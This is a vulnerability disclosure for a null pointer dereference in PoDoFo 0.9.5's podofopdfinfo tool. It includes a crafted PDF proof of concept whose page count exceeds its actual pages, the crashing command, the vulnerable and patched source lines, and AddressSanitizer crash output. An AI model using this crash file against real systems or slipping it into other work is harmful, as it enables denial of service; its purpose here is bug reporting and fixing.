This bug was discovered by Agostino Sarubbo of Gentoo.
2017-01-05: bug discovered

exploit
-------
$ podofopdfinfo GuessFormat-nullpointer-dereference.pdf 


file
-------
$ cat GuessFormat-nullpointer-dereference.pdf 
%PDF-1.5
1 0 obj
	<< /Type /Catalog
	/Pages 2 0 R
	>>
endobj
2 0 obj
	<< /Type /Pages
	/Kids [3 0 R]
	/Count 2
	>>
endobj
xref
0 3
0000000000 65535 f
0000000009 00000 n
0000000061 00000 n
trailer
	<<
	/Root 1 0 R
	>>
startxref
122
%%EOF


reason
---------
variable(curPage) is null and no measures in 0.9.5

podofo-0.9.5/tools/podofopdfinfo/pdfinfo.cpp:209
======================
curPage = mDoc->GetPage( pg );
rect = curPage->GetMediaBox();
======================

podofo-0.9.6/tools/podofopdfinfo/pdfinfo.cpp:209
======================
curPage = mDoc->GetPage( pg );
if( !curPage )
{
	PODOFO_RAISE_ERROR( PoDoFo::ePdfError_PageNotFound );
}
rect = curPage->GetMediaBox();
=======================


address sanitizer's output
-------
Document Info
-------------
	File: GuessFormat-nullpointer-dereference.pdf
	PDF Version: 1.5
	Page Count: 2
ASAN:DEADLYSIGNAL
=================================================================
==3834==ERROR: AddressSanitizer: SEGV on unknown address 0x00000000 (pc 0x0054e61f bp 0xbfb70138 sp 0xbfb6fe50 T0)
    #0 0x54e61e in PdfInfo::GuessFormat[abi:cxx11]() /home/debian/podofo-0.9.5/podofo-0.9.5/tools/podofopdfinfo/pdfinfo.cpp:210
    #1 0x54bc66 in PdfInfo::OutputDocumentInfo(std::ostream&) /home/debian/podofo-0.9.5/podofo-0.9.5/tools/podofopdfinfo/pdfinfo.cpp:40
    #2 0x553277 in main /home/debian/podofo-0.9.5/podofo-0.9.5/tools/podofopdfinfo/podofopdfinfo.cpp:117
    #3 0xb6d1e285 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18285)
    #4 0x54b6d0  (/usr/local/bin/podofopdfinfo+0xc56d0)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /home/debian/podofo-0.9.5/podofo-0.9.5/tools/podofopdfinfo/pdfinfo.cpp:210 in PdfInfo::GuessFormat[abi:cxx11]()
==3834==ABORTING


